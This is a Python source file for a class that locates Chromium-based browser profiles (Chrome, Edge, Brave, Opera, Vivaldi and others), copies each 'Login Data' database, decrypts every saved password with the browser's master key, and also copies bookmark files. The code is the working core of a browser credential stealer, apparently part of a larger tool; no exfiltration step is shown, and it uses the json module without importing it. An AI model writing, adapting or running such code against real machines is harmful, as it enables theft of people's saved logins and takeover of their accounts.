import os
import sqlite3
import shutil
from utils.crypto import get_master_key, decrypt_password

class ChromiumExtractor:
    def __init__(self, browser_name, user_data_path):
        self.browser_name = browser_name
        self.user_data_path = os.path.expandvars(user_data_path)
        self.local_state_path = os.path.join(self.user_data_path, "Local State")

    def extract_passwords(self):
        all_results = []
        if not os.path.exists(self.user_data_path):
            return []
            
        # Discover all directories that contain 'Login Data'
        profile_dirs = []
        for root, dirs, files in os.walk(self.user_data_path):
            if "Login Data" in files:
                profile_dirs.append(root)
            if root.count(os.sep) - self.user_data_path.count(os.sep) > 1:
                del dirs[:] # Don't go too deep
        
        master_key = get_master_key(self.local_state_path)
        if not master_key:
            alt_local_state = os.path.join(os.path.dirname(self.user_data_path), "Local State")
            master_key = get_master_key(alt_local_state)
        
        for p_dir in profile_dirs:
            p_name = os.path.basename(p_dir)
            # Try to get human-readable name from Preferences
            display_name = p_name
            prefs_path = os.path.join(p_dir, "Preferences")
            if os.path.exists(prefs_path):
                try:
                    with open(prefs_path, "r", encoding="utf-8") as f:
                        prefs = json.load(f)
                        display_name = prefs.get("profile", {}).get("name", p_name)
                except:
                    pass

            login_db = os.path.join(p_dir, "Login Data")
            temp_db = f"temp_{self.browser_name}_{p_name}.db".replace(" ", "_")
            try:
                shutil.copy2(login_db, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                
                for url, user, password in cursor.fetchall():
                    if user or password:
                        decrypted_pass = decrypt_password(password, master_key)
                        all_results.append({
                            "browser": f"{self.browser_name} ({display_name})",
                            "url": url,
                            "user": user,
                            "password": decrypted_pass
                        })
                conn.close()
            except Exception as e:
                print(f"Error in {self.browser_name} ({display_name}): {e}")
            finally:
                if os.path.exists(temp_db):
                    os.remove(temp_db)
            
        return all_results

    def extract_bookmarks(self, dest_dir):
        if not os.path.exists(self.user_data_path):
            return False
            
        profile_dirs = []
        for root, dirs, files in os.walk(self.user_data_path):
            if "Bookmarks" in files:
                profile_dirs.append(root)
            if root.count(os.sep) - self.user_data_path.count(os.sep) > 1:
                del dirs[:]
        
        target_root = os.path.join(dest_dir, "bookmarks", self.browser_name)
        os.makedirs(target_root, exist_ok=True)
        
        for p_dir in profile_dirs:
            p_name = os.path.basename(p_dir)
            src = os.path.join(p_dir, "Bookmarks")
            dst = os.path.join(target_root, f"Bookmarks_{p_name}")
            shutil.copy2(src, dst)
        return True

# Standard paths pointing to "User Data" root
BROWSERS = {
    "Chrome": r"%LOCALAPPDATA%\Google\Chrome\User Data",
    "Edge": r"%LOCALAPPDATA%\Microsoft\Edge\User Data",
    "Brave": r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data",
    "Opera": r"%APPDATA%\Opera Software\Opera Stable",
    "Opera GX": r"%APPDATA%\Opera Software\Opera GX Stable",
    "Vivaldi": r"%LOCALAPPDATA%\Vivaldi\User Data",
    "Comet": r"%LOCALAPPDATA%\Comet\User Data",
}
